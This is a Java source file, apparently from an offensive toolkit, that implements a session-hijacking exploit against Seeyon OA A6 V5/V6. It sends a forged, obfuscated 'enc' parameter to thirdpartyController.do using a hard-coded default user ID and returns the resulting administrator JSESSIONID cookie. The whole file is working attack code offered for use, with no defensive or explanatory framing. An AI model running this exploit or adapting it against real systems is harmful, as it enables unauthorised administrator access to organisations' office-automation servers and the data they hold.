package com.droplab.Controller.Seeyon.Common;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.seeyon.v3x.dbpool.util.Base64;
import org.jsoup.Connection;

import java.util.HashMap;

/**
 * thirdpartyController.do  获取系统管理员session
 */
public class A6V5V6SessionGet {
    private final String contentUrl = "/thirdpartyController.do";
    private final String encFormat = "L=message.link.doc.folder.open&M=%s&T=2583618396147";//

    private static A6V5V6SessionGet a6V5V6SessionGet = null;

    public static A6V5V6SessionGet instance() {
        if (a6V5V6SessionGet == null) {
            a6V5V6SessionGet = new A6V5V6SessionGet();
        }
        return a6V5V6SessionGet;
    }

    public String getCookie(String UID, String url) {
        try {
            if (UID == null || UID.equals("")) {
                UID = "-7273032013234748168";
            }
            String enc = String.format(encFormat, UID);
            HashMap paramMap = new HashMap();
            paramMap.put("method", "access");
            paramMap.put("enc", encodeString(enc));
            paramMap.put("clientPath", "127.0.0.1");
            HashMap<String, String> headers = new HashMap<>();
            CommonUtils.hashMapClone(InfoUtils.headers, headers);
            headers.put("Referer", url);
            Connection.Response post = HttpUtils.post(headers, url + contentUrl, paramMap);
            if (post.hasHeader("Set-Cookie")) {
                return "JSESSIONID=" + post.cookie("JSESSIONID") + "; ";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private String encodeString(String encodeString) {
        if (encodeString == null) {
            return null;
        } else {
            char[] encodeStringCharArray = encodeString.toCharArray();

            for (int i = 0; i < encodeStringCharArray.length; ++i) {
                ++encodeStringCharArray[i];
            }

            try {
                encodeString = new String((new Base64()).encode((new String(encodeStringCharArray)).getBytes()));
            } catch (Exception var3) {
                var3.printStackTrace();
            }
            return encodeString;
        }
    }

}
